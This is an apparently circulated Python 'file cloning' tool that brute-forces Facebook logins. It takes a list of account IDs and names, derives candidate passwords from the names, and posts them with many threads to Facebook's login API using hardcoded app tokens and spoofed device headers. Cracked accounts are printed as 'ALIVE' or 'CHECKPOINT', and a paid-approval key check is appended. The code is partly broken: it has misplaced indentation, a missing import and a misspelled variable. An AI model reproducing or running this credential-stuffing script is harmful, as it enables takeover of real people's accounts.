#WRITTEN BY OWEN FUEZO
#FOLLOW MY GITHUB : https://github.com/KLUEN-sketch/D4RK-0LM4R
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#----------logo----------#
logo=('''                       
░█████╗░░██╗░░░░░░░██╗███████╗███╗░░██╗
██╔══██╗░██║░░██╗░░██║██╔════╝████╗░██║
██║░░██║░╚██╗████╗██╔╝█████╗░░██╔██╗██║
██║░░██║░░████╔═████║░██╔══╝░░██║╚████║
╚█████╔╝░░╚██╔╝░╚██╔╝░███████╗██║░╚███║
░╚════╝░░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚══╝ ''')
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(42*'-')
    print(' FACEBOOK : OWEN FUEZO ')
    print(' GITHUB  : KLUEN-sketch')
    print(42*'-')
#----------line----------#
def line():
    print(42*'-')
#----------menu----------#
def main():
    clear()
    print(' [A] FILE CLONING ')
    print(' [E] EXIT ')
    line()
    option=input(' [??] CHOICE MENU : ')
    if option in ['a','A']:
        __file__()
    else:
        exit(' THANKS FOR USING ')
#----------file----------#
def __file__():
    clear()
    filex=input(' [??] ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-30) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Dipto:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Dipto.submit(m1,ids,names,passlist)
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'ow3n'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[•]\033[1;96m•────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m YOU LOGGED IN SUCCESSFULLY') 
            'sleep(1)'
            clear()
            key = 'false'
 #----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [RUNNING] %s|ALIVE:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI' , 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://b-graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print('\r\r [ALIVE] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
        def approval():
	first="OWEN["
	last="]KEY"
	uuid=str(os.getuid()) + str(os.getlogin())
	key = "6".join(uuid)
	a=requests.get("https://github.com/vionepogi/approval/blob/main/approval.txt").text
	if key in a:
		main()
	else:
		print("YOUR KEY IS NOT APPROVED")
		os.system("clear")
		print(logo)
		print("THIS TOOL IS PAID NEED APPROVAL FIRST ")
		print("PLEASE CONTACT TO ADMIN")
		os.system('espeak -a 300 " For approved contact admin"')
		print("Your key : "+frist+key+last)	
#----------end----------#
approval()
